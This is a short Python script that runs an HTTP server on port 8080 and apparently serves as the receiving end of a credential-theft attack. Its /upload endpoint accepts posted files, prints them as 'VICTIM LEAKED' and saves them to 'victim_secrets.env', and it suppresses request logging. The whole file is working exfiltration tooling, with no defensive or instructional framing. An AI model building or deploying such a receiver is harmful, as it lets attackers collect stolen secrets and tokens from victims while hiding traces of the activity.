from http.server import HTTPServer, BaseHTTPRequestHandler
import cgi

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/upload':
            form = cgi.FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={'REQUEST_METHOD': 'POST'}
            )
            if 'file' in form:
                leaked_env = form['file'].value  # Already string
                print(f"VICTIM LEAKED: {leaked_env[:200]}...")
                with open('victim_secrets.env', 'w') as f:
                    f.write(leaked_env)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'Upload success!')
            else:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b'Error: No file')
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        return

if __name__ == '__main__':
    httpd = HTTPServer(('0.0.0.0', 8080), Handler)
    print("Receiver listening on port 8080...")
    httpd.serve_forever()
